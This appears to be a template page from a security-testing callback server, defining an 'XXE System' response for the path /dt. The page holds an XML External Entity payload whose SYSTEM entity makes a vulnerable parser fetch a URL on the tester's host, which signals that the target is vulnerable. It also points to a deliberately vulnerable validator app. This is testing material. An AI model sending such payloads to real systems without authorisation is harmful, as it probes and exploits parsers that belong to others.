---
title: XXE System
description: More XXE
weight: 1
pattern: /dt$
is_final: true
data:
  headers:
    Content-Type: text/xml
  body: |-
    <?xml version="1.0" encoding="ISO-8859-1"?>
    <!DOCTYPE foo [
      <!ELEMENT foo ANY >
      <!ENTITY xxe SYSTEM "http://{{ .Host }}/{{ .NotifyString }}/xxe-test" >
    ]>
    <foo>&xxe;</foo>

---

### /dt

A vulnerable application for testing is in [../../../../cmd/xodbox-validator](../../../../cmd/xodbox-validator)

